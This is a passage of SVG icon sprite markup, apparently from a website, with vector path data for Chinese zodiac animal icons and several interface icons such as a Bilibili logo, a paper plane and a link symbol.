21.908211-3.072 32.202105 37.268211-12.584421 89.842526-25.465263 149.045895-25.465263C858.165895 269.473684 970.105263 387.907368 970.105263 571.176421 970.105263 711.922526 877.487158 862.315789 617.552842 862.315789c-258.667789 0-311.942737 19.698526-407.120842 150.581895z m19.105684-256.835368c-12.045474 0-24.387368-0.565895-37.025684-1.64379l-22.096842-1.859368-2.425263-22.016C167.747368 728.144842 161.684211 672.444632 161.684211 631.026526c0-103.585684 21.450105-178.903579 53.894736-259.045052V107.789474h53.894737v274.782315l-2.021052 4.904422C235.439158 465.758316 215.578947 533.800421 215.578947 631.026526c0 22.878316 2.101895 51.442526 3.826527 70.979369 99.678316 2.802526 172.813474-35.408842 222.450526-116.493474l48.020211 24.090947c-11.237053 28.133053-11.371789 51.577263-0.377264 67.853474 9.701053 14.282105 28.645053 23.174737 49.448421 23.174737v53.894737c-39.019789 0-74.186105-17.515789-94.073263-46.888421a100.244211 100.244211 0 0 1-12.422737-25.546106c-53.221053 49.178947-121.128421 73.943579-202.913684 73.970527zM379.957895 525.473684c0-34.223158-13.231158-44.463158-29.642106-44.463158s-29.642105 10.24-29.642105 44.463158c0 34.250105 13.231158 44.463158 29.642105 44.463158s29.642105-10.213053 29.642106-44.463158z" fill="#231F20" ></path></symbol><symbol id="icon-rooster_you" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#BBC4C9" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-215.578947-188.631579h-161.684211v-26.947368h161.684211V242.526316H269.473684v53.894737h161.684211v26.947368h-161.684211v485.052632h53.894737v-53.894737h377.263158v53.894737h53.894737V323.368421zM323.368421 646.736842h377.263158v53.894737H323.368421v-53.894737z m0-269.473684h107.789474c0 103.316211-72.784842 107.654737-81.084632 107.789474L350.315789 538.947368c46.592 0 134.736842-33.792 134.736843-161.68421h53.894736v107.789474c0 29.722947 24.171789 53.894737 53.894737 53.894736h107.789474v53.894737H323.368421v-215.578947z m377.263158 0v107.789474h-107.789474v-107.789474h107.789474z m-215.578947-80.842105h53.894736v26.947368h-53.894736v-26.947368z" fill="#231F20" ></path></symbol><symbol id="icon-rooster" viewBox="0 0 1024 1024"><path d="M891.688421 506.421895C877.244632 455.033263 862.315789 401.893053 862.315789 323.368421V116.224l-323.368421 195.745684V323.368421c0 78.524632 14.928842 131.664842 29.372632 183.053474 12.611368 44.894316 24.522105 87.282526 24.522105 140.314947 0 101.618526-77.931789 176.693895-168.286316 203.991579l5.416422 11.587368h215.578947c24.333474 0 43.385263-0.242526 58.556631-2.128842C811.52 846.821053 916.210526 764.550737 916.210526 646.736842c0-53.032421-11.910737-95.420632-24.522105-140.314947z" fill="#FF8787" ></path><path d="M673.684211 354.357895c-16.384 0-29.642105-10.213053-29.642106-44.463158 0-34.223158 13.231158-44.463158 29.642106-44.463158s29.642105 10.24 29.642105 44.463158c0 34.250105-13.258105 44.463158-29.642105 44.463158zM540.106105 970.105263l-50.58021-107.789474h156.05221l50.607158 107.789474h59.553684l-51.60421-109.918316C811.52 846.821053 916.210526 764.550737 916.210526 646.736842c0-53.032421-11.910737-95.420632-24.522105-140.314947C877.244632 455.033263 862.315789 401.893053 862.315789 323.368421V107.789474c0-59.445895-48.343579-107.789474-107.789473-107.789474a107.924211 107.924211 0 0 0-107.789474 106.172632 100.890947 100.890947 0 0 0-24.117895-3.314527 88.710737 88.710737 0 0 0-88.602947 88.602948c0 20.668632 5.227789 39.720421 10.671158 53.921684l-99.489684 59.688421 93.749894 14.470737V377.263158c0 14.416842-5.901474 21.692632-33.360842 49.152l-11.129263 11.129263C398.228211 326.521263 324.985263 269.473684 215.740632 269.473684 96.768 269.473684 0 366.241684 0 485.214316V646.736842h53.894737v-161.522526A162.007579 162.007579 0 0 1 215.740632 323.368421c82.081684 0 140.422737 36.244211 240.64 152.252632l-38.615579 38.615579C367.804632 461.285053 323.098947 431.157895 259.584 431.157895A151.983158 151.983158 0 0 0 107.789474 582.952421V754.526316h53.894737v-171.573895A98.007579 98.007579 0 0 1 259.584 485.052632c46.322526 0 79.629474 20.911158 137.027368 86.016l18.970948 21.530947 128.080842-128.080842C572.200421 435.981474 592.842105 415.366737 592.842105 377.263158v-97.926737l23.309474-14.120421-13.662316-23.04c-0.161684-0.242526-14.578526-24.899368-14.578526-50.688 0-19.132632 15.575579-34.708211 34.70821-34.708211 5.093053 0 26.785684 3.179789 39.558737 18.647579l26.327579 46.026106 39.774316-24.090948-20.372211-49.367579C704.754526 140.449684 700.631579 117.517474 700.631579 107.789474c0-29.722947 24.171789-53.894737 53.894737-53.894737s53.894737 24.171789 53.894737 53.894737v215.578947c0 85.935158 16.680421 145.300211 31.366736 197.632C851.887158 564.008421 862.315789 601.141895 862.315789 646.736842c0 95.285895-99.408842 161.684211-188.631578 161.684211h-209.461895l-68.419369-145.704421C375.242105 618.954105 338.108632 592.842105 296.448 592.842105A80.976842 80.976842 0 0 0 215.578947 673.711158V862.315789h53.894737v-188.604631c0-14.874947 12.099368-26.974316 26.974316-26.974316 20.533895 0 38.965895 14.147368 50.553263 38.858105L480.579368 970.105263h59.526737z" fill="#231F20" ></path></symbol><symbol id="icon-snake_si" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#FF8787" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-242.041263 180.762947l-52.116211-13.797052C657.219368 749.864421 651.425684 754.526316 619.789474 754.526316h-242.526316V485.052632h269.473684v53.894736h53.894737V215.578947H323.368421v538.947369c0 29.722947 24.171789 53.894737 53.894737 53.894737h242.526316c77.689263 0 91.189895-51.065263 108.274526-115.658106zM377.263158 269.473684h269.473684v161.684211H377.263158v-161.684211z" fill="#231F20" ></path></symbol><symbol id="icon-tiger_yin" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#7DD47F" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-257.42821 299.250526l-107.789474-53.894737-24.117895 48.208843 107.789474 53.894736 24.117895-48.208842z m-269.473685-5.658947l-24.117894-48.208842-107.789474 53.894737 24.117895 48.208842 107.789473-53.894737zM700.631579 431.157895h-161.684211v-53.894737h107.789474v-53.894737H377.263158v53.894737h107.789474v53.894737h-161.684211v323.368421h53.894737v-53.894737h269.473684v53.894737h53.894737V431.157895z m-161.684211 161.68421h107.789474v53.894737h-107.789474v-53.894737z m-161.68421 0h107.789474v53.894737h-107.789474v-53.894737z m161.68421-107.789473h107.789474v53.894736h-107.789474v-53.894736z m-161.68421 0h107.789474v53.894736h-107.789474v-53.894736zM754.526316 215.578947h-223.097263l-20.803369-62.410105-51.119158 17.057684L474.624 215.578947H269.473684v107.789474h53.894737v-53.894737h377.263158v53.894737h53.894737V215.578947z" fill="#231F20" ></path></symbol><symbol id="icon-snake" viewBox="0 0 1024 1024"><path d="M107.789474 790.474105c0-72.434526 67.880421-91.513263 121.451789-91.513263 74.401684 0 153.815579 34.438737 237.891369 70.925474 50.580211 21.935158 104.609684 45.325474 162.250105 63.083789-52.412632 44.786526-118.784 74.347789-195.152842 83.078737-143.171368 16.357053-326.440421 7.006316-326.440421-125.574737zM377.263158 215.578947c-15.575579 0-30.288842 3.449263-43.654737 9.377685A250.691368 250.691368 0 0 0 323.368421 296.421053c0 115.550316 76.422737 169.391158 137.83579 212.614736 8.138105 5.712842 16.141474 11.371789 23.848421 17.057685V323.368421a107.789474 107.789474 0 0 0-107.789474-107.789474z" fill="#C3D686" ></path><path d="M671.528421 788.857263c44.328421 11.964632 89.626947 19.563789 136.892632 19.56379 89.168842 0 161.684211-60.442947 161.68421-134.736842s-72.515368-134.736842-161.68421-134.736843c-19.078737 0-37.025684 1.509053-54.218106 4.015158-0.754526-101.402947-38.211368-172.355368-79.413894-219.648L673.684211 323.368421a1749.962105 1749.962105 0 0 1-79.036632-1.751579c45.702737 35.866947 108.705684 107.870316 105.984 232.367158 0 0.431158-0.080842 0.808421-0.10779 1.239579-34.923789 10.994526-66.155789 26.731789-95.097263 45.190737a163.085474 163.085474 0 0 0-15.845052-42.388211c-21.557895-39.639579-60.065684-66.775579-97.360842-93.022316C433.098105 423.343158 377.263158 384 377.263158 296.421053c0-130.290526 108.274526-188.631579 215.578947-188.631579 64.134737 0 132.715789 12.045474 214.366316 37.807158C802.330947 180.250947 780.099368 209.381053 700.631579 214.635789V161.684211h-53.894737v53.679157c-63.272421-1.024-104.528842-5.200842-104.986947-5.254736l-5.578106 53.598315C538.408421 263.949474 592.357053 269.473684 673.684211 269.473684c125.170526 0 188.631579-48.128 188.631578-143.063579V106.981053l-18.432-6.144C747.789474 68.823579 668.025263 53.894737 592.842105 53.894737c-158.666105 0-269.473684 99.732211-269.473684 242.526316 0 115.550316 76.422737 169.391158 137.83579 212.614736 33.684211 23.713684 65.509053 46.106947 81.003789 74.698106 9.539368 17.542737 13.285053 33.414737 12.341895 47.750737 21.153684 9.108211 42.118737 17.839158 62.949052 25.977263C671.151158 620.193684 729.977263 592.842105 808.421053 592.842105c59.445895 0 107.789474 36.271158 107.789473 80.842106s-48.343579 80.842105-107.789473 80.842105c-105.472 0-203.237053-42.388211-297.768421-83.429053-94.800842-41.094737-184.346947-79.952842-281.411369-79.952842C122.718316 591.171368 53.894737 644.715789 53.894737 727.578947c0 79.063579 67.098947 136.434526 159.555368 136.434527 142.174316 0 230.426947-66.883368 306.79579-129.886316 31.420632 13.419789 62.787368 26.058105 94.450526 37.133474-47.077053 49.637053-110.969263 82.566737-186.610526 91.270736l5.066105 53.625264c93.453474-7.006316 143.144421 9.350737 195.718737 26.543157 46.457263 15.225263 94.127158 30.854737 169.822316 30.854737 19.994947 0 41.957053-1.077895 66.344421-3.557052l-5.416421-53.625263c-105.283368 10.778947-158.100211-6.548211-213.935158-24.872422-22.150737-7.275789-44.624842-14.632421-70.305684-20.345263a334.848 334.848 0 0 0 96.14821-82.297263z m-458.078316 21.261474C162.573474 810.118737 107.789474 784.276211 107.789474 727.578947c0-60.847158 62.733474-82.539789 121.451789-82.539789 77.850947 0 154.731789 30.288842 235.250526 64.943158-66.263579 52.924632-139.722105 100.136421-251.041684 100.136421z" fill="#231F20" ></path></symbol><symbol id="icon-tiger" viewBox="0 0 1024 1024"><path d="M431.157895 162.250105V134.736842c0-41.552842-39.289263-80.842105-80.842106-80.842105-28.833684 0-57.128421 4.661895-58.314105 4.850526L269.473684 62.490947v83.887158C144.788211 223.824842 89.222737 346.839579 66.991158 431.157895h266.051368c240.747789 0 415.851789 107.789474 415.85179 269.473684-14.848-25.114947-43.924211-53.894737-88.68379-53.894737-67.988211 0-121.263158 71.033263-121.263158 161.684211 0 66.802526 30.477474 119.888842 60.712421 156.16 12.638316 15.171368 36.055579 37.726316 59.014737 58.88 5.066105 0.107789 9.781895 0.538947 15.009685 0.538947 219.297684 0 350.315789-191.811368 350.315789-377.263158C1024 327.545263 679.855158 172.813474 431.157895 162.250105z" fill="#F7C768" ></path><path d="M673.684211 1024c-114.768842 0-188.820211-33.333895-254.167579-62.787368-53.625263-24.144842-99.974737-45.002105-161.28-45.002106-40.448 0-83.590737 23.255579-103.639579 45.16379l-39.747369-36.432842C142.497684 894.787368 199.168 862.315789 258.236632 862.315789c68.392421 0 119.861895 21.288421 172.921263 45.056V673.684211c0-35.166316-17.542737-64.107789-30.639158-80.815158-15.198316 9.835789-32.067368 18.890105-50.741895 26.947368l-21.342316-49.475368C469.800421 509.413053 485.052632 377.317053 485.052632 323.368421V221.642105A597.827368 597.827368 0 0 0 404.210526 215.578947h-26.947368V134.736842c0-12.099368-14.848-26.947368-26.947369-26.947368-9.377684 0-18.836211 0.592842-26.947368 1.347368V269.473684h-53.894737V211.671579c-136.030316 102.912-158.450526 266.886737-161.306947 295.882105 9.135158 9.108211 38.992842 25.061053 71.976421 38.669474l38.103579-59.365053 12.449684-1.589894C321.212632 473.653895 377.263158 392.192 377.263158 323.368421h53.894737c0 88.333474-68.796632 192.242526-180.870737 213.342316l-48.397474 75.398737-20.291368-7.437474C53.894737 557.756632 53.894737 523.317895 53.894737 512c0-50.041263 37.025684-254.733474 215.578947-365.621895V62.490947l22.528-3.745684C293.187368 58.556632 321.482105 53.894737 350.315789 53.894737c41.552842 0 80.842105 39.289263 80.842106 80.842105v27.513263c248.697263 10.563368 592.842105 165.295158 592.842105 484.486737 0 185.451789-131.018105 377.263158-350.315789 377.263158z m-13.473685-323.368421c-36.513684 0-67.368421 49.367579-67.368421 107.789474 0 85.746526 68.096 145.084632 89.465263 161.549473 91.540211-2.533053 164.378947-45.487158 213.827369-107.654737H700.631579v-53.894736h230.238316c8.919579-17.273263 16.357053-35.354947 22.285473-53.894737h-239.885473l-6.467369-17.650527C706.290526 735.582316 692.439579 700.631579 660.210526 700.631579zM485.052632 931.112421c33.926737 14.066526 70.521263 26.597053 114.607157 33.468632C569.424842 928.309895 538.947368 875.223579 538.947368 808.421053c0-90.650947 53.274947-161.684211 121.263158-161.684211 44.759579 0 73.835789 28.779789 88.68379 53.894737h217.007158c2.775579-17.866105 4.203789-35.920842 4.203789-53.894737 0-38.938947-5.658947-74.752-15.925895-107.627789l-126.706526 126.679579-38.103579-38.103579L932.001684 485.052632a367.939368 367.939368 0 0 0-57.775158-81.596632l-154.543158 154.543158-38.103579-38.103579 153.573053-153.573053a537.869474 537.869474 0 0 0-82.593684-56.751158l-140.665263 140.638316-38.103579-38.103579 128.134737-128.134737A794.731789 794.731789 0 0 0 538.947368 231.046737V323.368421c0 50.149053-11.102316 156.698947-95.932631 236.328421 18.378105 23.417263 42.037895 63.407158 42.037895 113.987369v257.42821zM215.578947 431.157895v-53.894737c39.774316 0 53.894737-29.022316 53.894737-53.894737h53.894737c0 53.571368-37.025684 107.789474-107.789474 107.789474z" fill="#231F20" ></path></symbol><symbol id="icon-boar" viewBox="0 0 1024 1024"><path d="M732.079158 377.263158c-107.789474 0-186.421895 31.393684-281.869474 126.841263L180.331789 773.982316C257.724632 807.909053 348.725895 808.421053 485.052632 808.421053h96.013473c55.834947-34.411789 133.551158-53.894737 227.354948-53.894737h121.344L970.105263 680.555789V572.631579c0-94.315789-130.236632-195.368421-238.026105-195.368421z" fill="#FFBDD8" ></path><path d="M808.421053 700.631579v53.894737c-196.446316 0-323.368421 84.641684-323.368421 215.578947h-53.894737c0-163.705263 148.075789-269.473684 377.263158-269.473684z m-323.368421 107.789474v-53.894737c-158.342737 0-245.598316 0-319.649685-49.367579L158.612211 700.631579H80.842105c-21.692632 0-26.624-14.821053-26.947368-26.947368v-82.620632c84.156632-11.183158 161.684211-74.913684 161.68421-186.853053V215.578947H161.684211v161.684211H134.736842c-66.964211 0-134.736842 37.025684-134.736842 107.789474h53.894737c0-42.630737 52.870737-53.894737 80.842105-53.894737h24.629895C147.132632 504.912842 85.153684 538.947368 26.947368 538.947368H0v134.736843c0 32.498526 21.530947 80.842105 80.842105 80.842105h61.682527c32.687158 20.506947 67.125895 33.145263 105.957052 41.013895A232.879158 232.879158 0 0 0 215.578947 916.210526h53.894737c0-41.930105 14.012632-80.303158 39.424-112.505263C358.885053 808.151579 415.959579 808.421053 485.052632 808.421053z m-72.946527-342.420211L323.368421 554.738526V431.157895h-53.894737v253.682526l180.736-180.736-38.103579-38.103579zM323.368421 161.684211h-53.894737v190.032842a769.536 769.536 0 0 1 53.894737-49.098106V161.684211z m323.368421-53.894737c-72.623158 0-146.809263 23.336421-215.578947 58.637473V107.789474h-53.894737v154.138947C458.832842 205.392842 555.331368 161.684211 646.736842 161.684211c148.587789 0 269.473684 120.885895 269.473684 269.473684v235.654737L809.579789 862.315789h61.359158L970.105263 680.555789V431.157895c0-178.310737-145.057684-323.368421-323.368421-323.368421z" fill="#231F20" ></path></symbol><symbol id="icon-boar_hai" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#85C3DE" ></path><path d="M309.975579 804.756211l-27.136-46.592c103.073684-60.011789 183.026526-132.473263 241.475368-219.24379H350.315789l-13.473684-50.283789c58.88-33.980632 99.435789-117.571368 118.703158-165.295158H242.526316v-53.894737h538.947368v53.894737h-268.18021c-12.395789 34.088421-42.469053 106.603789-90.435369 161.68421h134.009263a680.555789 680.555789 0 0 0 46.349474-107.708631l51.092211 17.057684c-58.421895 175.265684-171.034947 309.490526-344.333474 410.381474z m192.350316-2.937264L467.806316 760.454737c88.414316-73.728 154.516211-158.773895 202.105263-259.907369l48.801684 22.959158a797.372632 797.372632 0 0 1-82.351158 137.781895c32.741053 15.009684 83.456 44.867368 137.647158 101.591579l-38.938947 37.268211c-57.236211-59.877053-109.325474-85.557895-133.766737-95.178106a850.997895 850.997895 0 0 1-98.977684 96.848842z m48.613052-536.872421l-80.842105-53.894737 29.884632-44.840421 80.842105 53.894737-29.884632 44.840421zM512 53.894737C259.395368 53.894737 53.894737 259.395368 53.894737 512s205.500632 458.105263 458.105263 458.105263c9.081263 0 17.973895-0.835368 26.947368-1.374316v-53.894736c-8.946526 0.619789-17.866105 1.374316-26.947368 1.374315-222.881684 0-404.210526-181.328842-404.210526-404.210526S289.118316 107.789474 512 107.789474s404.210526 181.328842 404.210526 404.210526c0 195.206737-139.075368 358.507789-323.368421 396.045474v54.460631c214.096842-38.346105 377.263158-225.549474 377.263158-450.533052C970.105263 259.395368 764.604632 53.894737 512 53.894737z" fill="#231F20" ></path></symbol><symbol id="icon-bilibili1" viewBox="0 0 1129 1024"><path d="M234.909 9.656a80.468 80.468 0 0 1 68.398 0 167.374 167.374 0 0 1 41.843 30.578l160.937 140.82h115.07l160.936-140.82a168.983 168.983 0 0 1 41.843-30.578A80.468 80.468 0 0 1 930.96 76.445a80.468 80.468 0 0 1-17.703 53.914 449.818 449.818 0 0 1-35.406 32.187 232.553 232.553 0 0 1-22.531 18.508h100.585a170.593 170.593 0 0 1 118.289 53.109 171.397 171.397 0 0 1 53.914 118.288v462.693a325.897 325.897 0 0 1-4.024 70.007 178.64 178.64 0 0 1-80.468 112.656 173.007 173.007 0 0 1-92.539 25.75H212.377a341.186 341.186 0 0 1-72.421-4.024A177.835 177.835 0 0 1 28.91 939.065a172.202 172.202 0 0 1-27.36-92.539V388.662a360.498 360.498 0 0 1 0-66.789A177.03 177.03 0 0 1 162.487 178.64h105.414c-16.899-12.07-31.383-26.555-46.672-39.43a80.468 80.468 0 0 1-25.75-65.984 80.468 80.468 0 0 1 39.43-63.57M216.4 321.873a80.468 80.468 0 0 0-63.57 57.937 108.632 108.632 0 0 0 0 30.578v380.615a80.468 80.468 0 0 0 55.523 80.469 106.218 106.218 0 0 0 34.601 5.632h654.208a80.468 80.468 0 0 0 76.444-47.476 112.656 112.656 0 0 0 8.047-53.109v-354.06a135.187 135.187 0 0 0 0-38.625 80.468 80.468 0 0 0-52.304-54.719 129.554 129.554 0 0 0-49.89-7.242H254.22a268.764 268.764 0 0 0-37.82 0z m0 0" fill="#20B0E3" ></path><path d="M348.369 447.404a80.468 80.468 0 0 1 55.523 18.507 80.468 80.468 0 0 1 28.164 59.547v80.468a80.468 80.468 0 0 1-16.094 51.5 80.468 80.468 0 0 1-131.968-9.656 104.609 104.609 0 0 1-10.46-54.719v-80.468a80.468 80.468 0 0 1 70.007-67.593z m416.02 0a80.468 80.468 0 0 1 86.102 75.64v80.468a94.148 94.148 0 0 1-12.07 53.11 80.468 80.468 0 0 1-132.773 0 95.757 95.757 0 0 1-12.875-57.133V519.02a80.468 80.468 0 0 1 70.007-70.812z m0 0" fill="#20B0E3" ></path></symbol><symbol id="icon-yinle" viewBox="0 0 1024 1024"><path d="M512.2976 0a531.2 531.2 0 0 0-512 548.48V960h128V548.48a398.72 398.72 0 0 1 384-411.52 398.72 398.72 0 0 1 384 411.52V960h128V548.48A531.2 531.2 0 0 0 512.2976 0z" fill="#5c8add" ></path><path d="M64.2976 576l256 0 0 448-256 0 0-448Z" fill="#5c8add" ></path><path d="M704.2976 576l256 0 0 448-256 0 0-448Z" fill="#5c8add" ></path></symbol><symbol id="icon-icon-test-copy" viewBox="0 0 1024 1024"><path d="M512 512m-229.517241 0a229.517241 229.517241 0 1 0 459.034482 0 229.517241 229.517241 0 1 0-459.034482 0Z" fill="#5c8add" ></path><path d="M512 1024A512 512 0 1 1 1024 512 512 512 0 0 1 512 1024z m0-141.241379A370.758621 370.758621 0 1 0 141.241379 512 370.758621 370.758621 0 0 0 512 882.758621z" fill="#5c8add" ></path></symbol><symbol id="icon-V" viewBox="0 0 1024 1024"><path d="M1012.47774251 492.58192592L544.94137566 87.22962963a49.96686561 49.96686561 0 0 0-65.88275132 0L11.63784127 492.6975097c-21.03624691 18.26223633-23.3479224 49.93219048-5.08568606 70.96843739 18.03106878 21.03624691 49.93219048 23.3479224 70.96843738 5.08568607L512 191.83294532l434.71057495 376.91868784c9.47786949 8.20644797 21.26741446 12.25188008 32.82579189 12.13629629 14.10122046 0 27.97127337-5.77918871 38.02706173-17.33756613 18.14665256-20.92066314 15.95056084-52.70620106-5.08568606-70.9684374z" fill="#5c8add" ></path><path d="M109.30613051 567.59579541V896.89396825c0 42.53482892 34.90629982 77.44112875 77.44112875 77.44112875h220.76500882V666.30433862c0-25.54401411 20.92066314-46.46467725 46.46467724-46.46467724h116.16169313c25.54401411 0 46.46467725 20.92066314 46.46467725 46.46467724V974.335097h220.76500882c42.53482892 0 77.44112875-34.90629982 77.44112874-77.44112875l0.11558377-329.29817284L512 218.18604586 109.30613051 567.59579541zM848.00203175 197.49655027h-63.91782716c-12.82979894 0-23.23233862 10.40253968-23.23233863 23.23233862v24.27259259l110.49808818 95.70336508V220.72888889h-0.11558377c0-12.82979894-10.40253968-23.23233862-23.23233862-23.23233862zM905.44716754 83.18419754s-34.90629982 56.86721693-89.11508994 100.32671603c152.68616579 13.98563668 127.83565432-133.26809171 127.83565432-133.2680917-134.07717813-10.28695591-132.92134039 102.29164021-131.072 127.83565432 20.92066314-20.92066314 49.70102293-62.64640564 92.35143562-94.89427865zM798.53217637 174.61096297c-19.64924162-16.52847972-40.56990476-43.45949912-51.203612-53.97762258 0 0 32.94137566 20.57391182 56.40488184 49.3542716 2.42725926-18.37782011 6.47269135-93.3916896-93.16052205-85.3008254 0 0-13.98563668 104.71889947 87.95925221 89.92417638z" fill="#5c8add" ></path></symbol><symbol id="icon-zhifeiji" viewBox="0 0 1167 1024"><path d="M41.201759 463.52493L1110.665064 30.117647c10.32605-4.159104 21.942857 0.860504 26.101961 11.043137 1.434174 3.728852 1.864426 7.744538 1.003921 11.616807L949.033691 978.823529c-2.151261 10.89972-12.764146 17.927171-23.663865 15.632493-2.72493-0.573669-5.306443-1.721008-7.601121-3.298599L634.80624 789.79944l-163.065546 133.951821c-16.492997 13.62465-40.87395 11.186555-54.498599-5.306443-3.011765-3.728852-5.306443-7.887955-6.884034-12.477311l-102.973669-313.080112-265.178712-91.787115c-10.469468-3.585434-16.062745-15.058824-12.333893-25.528291 1.864426-5.44986 6.023529-9.895798 11.329972-12.047059z" fill="#FCFDFC" ></path><path d="M929.385512 1023.569748c-3.155182 0-6.453782-0.286835-9.752381-1.003922-6.740616-1.434174-12.907563-4.015686-18.50084-8.031372L635.953579 825.940616l-146.142297 120.040336c-13.911485 11.473389-31.408403 16.779832-49.335574 15.058824-17.927171-1.721008-34.133333-10.32605-45.463305-24.237535-5.306443-6.453782-9.322129-13.768067-11.903642-21.79944l-98.527731-299.598879-251.697479-87.19776c-12.333894-4.302521-22.229692-13.05098-27.966386-24.811204s-6.453782-24.954622-2.151261-37.288515c4.589356-13.337815 14.771989-23.9507 27.82297-29.257143L1099.908761 3.585434c24.954622-10.039216 53.351261 2.007843 63.533894 26.819048 3.585434 8.891877 4.445938 18.644258 2.581513 28.109804L977.143495 984.560224c-4.732773 23.090196-25.098039 39.009524-47.757983 39.009524z m-294.579272-233.770308l282.962465 201.357983c2.294678 1.577591 4.87619 2.72493 7.601121 3.298599 10.89972 2.151261 21.512605-4.87619 23.663865-15.632493L1137.914364 52.777591c0.860504-3.872269 0.430252-7.887955-1.003922-11.616807-4.159104-10.32605-15.919328-15.202241-26.101961-11.043137L41.201759 463.52493c-5.306443 2.151261-9.465546 6.597199-11.47339 12.047059-1.721008 5.019608-1.434174 10.469468 0.860505 15.345658 2.294678 4.87619 6.453782 8.461625 11.473389 10.182633l265.178711 91.787115L410.214644 905.967507c1.434174 4.589356 3.872269 8.748459 6.884033 12.477311 6.597199 8.031373 15.919328 12.907563 26.101961 13.911485 10.32605 1.003922 20.365266-2.007843 28.396639-8.605042l163.208963-133.951821z" fill="#4A4A4A" ></path><path d="M307.097557 592.743978l105.698599 316.091876c6.310364 18.787675 26.532213 28.970308 45.319888 22.659944 4.159104-1.434174 7.887955-3.442017 11.186555-6.166946l164.786555-133.951821-165.360224-118.892997c297.017367-287.982073 447.462185-433.980952 451.191036-437.853222 0.573669-0.573669 2.581513-3.442017 0.430252-7.027451-1.290756-1.577591-3.298599-3.298599-7.027451-2.15126-202.218487 120.327171-404.293557 242.805602-606.22521 367.291877z" fill="#CAE0EE" ></path><path d="M446.786072 934.794398c-5.736695 0-11.329972-1.290756-16.636414-3.872269-8.891877-4.445938-15.632493-12.047059-18.787675-21.512605L305.376549 592.313725l1.003921-0.573669C507.308201 467.684034 711.391114 344.058263 912.60568 224.161345l0.286835-0.143418c3.585434-1.147339 6.310364-0.286835 8.605042 2.581513l0.143417 0.143417c2.438095 4.015686 0.573669 7.457703-0.573669 8.74846-3.872269 4.015686-155.177591 150.87507-450.043698 436.705882l165.503642 119.036414-166.220728 135.09916c-3.442017 2.868347-7.457703 5.019608-11.760225 6.453782-3.728852 1.290756-7.744538 2.007843-11.760224 2.007843z m-137.967507-341.333334l105.268348 314.944538c2.868347 8.748459 9.035294 15.77591 17.210084 19.935014 8.17479 4.159104 17.496919 4.732773 26.245378 1.864426 3.872269-1.290756 7.60112-3.298599 10.756302-5.880112l163.352381-132.804482L466.434252 672.627451l1.290756-1.147339C763.308201 384.932213 915.043775 237.642577 918.772627 233.626891c0 0 2.007843-2.294678 0.286835-5.306443-1.003922-1.290756-2.438095-2.438095-5.306443-1.577591-200.784314 119.610084-404.293557 242.94902-604.934454 366.718207z" fill="#CAE0EE" ></path><path d="M460.840974 924.898599l7.457703-253.561904 165.933894 119.896918-168.658824 135.959664c-1.290756 1.003922-3.011765 0.860504-4.015686-0.430252-0.430252-0.430252-0.717087-1.147339-0.717087-1.864426z" fill="#94C3E2" ></path><path d="M463.709322 929.344538c-1.290756 0-2.438095-0.573669-3.2986-1.577591-0.573669-0.860504-1.003922-1.864426-1.003921-2.868348l7.60112-256.286834 169.519328 122.621848-1.434174 1.147339-168.658823 135.959664c-0.860504 0.717087-1.721008 1.003922-2.72493 1.003922z m6.023529-255.282913l-7.457703 250.836974c0 0.286835 0.143417 0.717087 0.286835 1.003922 0.430252 0.573669 1.434174 0.717087 2.007843 0.286835l167.22465-134.812325-162.061625-117.315406z" fill="#94C3E2" ></path></symbol><symbol id="icon-lianjie" viewBox="0 0 1079 1024"><path d="M695.355535 432.666896c-0.553495-1.10699-0.885592-2.186305-1.383737-3.265619-0.193723-0.193723-0.193723-0.359772-0.359771-0.719543-12.508983-26.318678-39.436506-43.366319-69.325226-41.013966-39.076734 3.265619-68.439634 39.021384-65.312388 79.841627 0.857917 10.516401 3.653066 20.147211 7.998 28.83708 19.78744 46.659613 11.097571 103.448181-25.377737 141.750022l-191.094085 199.950001a118.088119 118.088119 0 0 1-171.998513 0c-47.434506-49.537786-47.434506-130.098956 0-179.636742l71.234782-74.389703-0.52582-0.553494a75.911814 75.911814 0 0 0 24.326097-61.880721c-3.127246-40.820243-37.3609-71.51153-76.437634-68.24591a69.463599 69.463599 0 0 0-46.908685 23.966325l-0.166049-0.193723-72.618519 75.856464c-103.226783 107.793115-103.226783 282.36538 0 390.158495 103.171433 107.793115 270.299193 107.793115 373.498301 0l191.619904-200.1714c80.256748-83.992838 97.636485-208.307773 52.83108-310.289193z" fill="#5c8add" ></path><path d="M1002.047012 